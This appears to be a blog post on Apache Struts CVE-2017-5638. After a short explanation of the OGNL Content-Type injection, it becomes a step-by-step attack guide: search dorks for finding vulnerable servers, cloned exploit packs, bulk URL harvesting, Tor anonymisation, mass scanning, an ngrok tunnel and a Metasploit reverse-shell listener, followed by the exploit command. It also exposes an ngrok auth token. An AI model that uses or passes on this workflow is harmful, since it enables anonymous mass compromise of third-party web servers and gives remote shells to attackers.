---
title: APACHE STRUTS VULNERABILITY CVE 2017-5638 - Quick Sort
category: Sample
date: 2019-2-19
author: Read Loud
category: Sample
comment: true
---

# What is CVE-2017-5638?
Struts is vulnerable to remote command injection attacks through incorrectly parsing an attacker’s invalid Content-Type HTTP header. The Struts vulnerability allows these commands to be executed under the privileges of the Web server. This is full remote command execution and has been actively exploited in the wild from the initial disclosure.

The vulnerable code is in the Jakarta Multipart parser. If the Content-Type value isn’t valid, that is, it does not match an expected valid type, an exception is thrown that is then used to display an error message to a user. In this case, we can set the Content-Type to an OGNL expression such as:

~~~bash
Content­Type: ${(#_='multipart/form­data')}...
#eps=#container.toString()
#cmds=({'/bin/echo', #eps})
com.opensymphony.xwork2.inject.ContainerImpl@d0d2b00
~~~
![img-sample](https://www.synopsys.com/blogs/software-security/wp-content/uploads/HTTPRequestWithCurl.png)

## FIND POTENTIAL TARGETS

intitle:"Struts problem report" intext:"Struts has detected an Unhandled"
intitle:"Struts Problem Report" intext:"development mode is enabled."
filetype:action
filetype:do
filetype:java
filetype:out
filetype:bat
filetype:seam
filetype:sh
filetype:bson
filetype:el
filetype:pm
inurl:login.action
inurl:login.do
inurl:login.java
inurl:index.action
inurl:index.do
inurl:index.java

## DEPENDENCIES

~~~bash
git clone https://github.com/s1kr10s/Apache-Struts-v3.git
git clone https://github.com/drigg3r/Struts-Apache-ExploitPack.git
git clone https://github.com/opsdisk/pagodo.git
git clone https://github.com/3ndG4me/torphantom.git
~~~

## Optional
Save your dorks list into a file such as "dorks.txt"
Specify the output path and filename such as "urls.txt"
~~~bash
$ sudo python pagodo.py ­-g dorks.txt ­-l 200 ­-s ­-e 35.0 ­-j 1.1 >> urls.txt
~~~

## INITIALIZE TOR SESSION
Start Torphantom

###  Type the below commands

~~~bash
$ sudo torphantom start ­-i <interface>
~~~

Scan using Struts-Scanner

### Type the below commands and follow up the screen prompt
~~~bash
$ ./struts­-scanner
~~~

Scan using Jexboss

### Type the below commands after correcting the input and output file paths
~~~bash
$ python jexboss.py ­-mode -file­-scan -­file /path/file/urls.txt ­-out /path/output/results.log ­­--struts2
~~~

## INITIALIZE TCP TUNNELING

Start Ngrok

###  Your Token can be found in your Ngrok account

~~~bash
$ ./ngrok authtoken 8ml78jQFrVNah4cN8UwTt_5ZVZYRPD8q7huTk7vo8MZ
~~~

Create the Session

### Create the Ngrok session on the port 4444 using the below command
~~~bash
$ ./ngrok tcp 4444
~~~

## CREATE MSF HANDLER

Start Metasploit

### Open Metasploit
~~~bash
$ msfconsole
$ msf > use exploit/multi/handler
$ msf exploit(multi/handler) > set LHOST 0.0.0.0 LHOST => 0.0.0.0
$ msf exploit(multi/handler) > set LPORT 4444 LPORT => 4444
$ msf exploit(multi/handler) > set PAYLOAD linux/x86/shell/reverse_tcp PAYLOAD => linux/x86/shell/reverse_tcp msf exploit(multi/handler) > show options
~~~

## EXPLOIT THE TARGET
Jexboss Commands
~~~bash
$ sudo python jexboss.py -u http://example.com/login.action
~~~

Complete Guide:[here](https://youtu.be/Bt9m__yel8M)
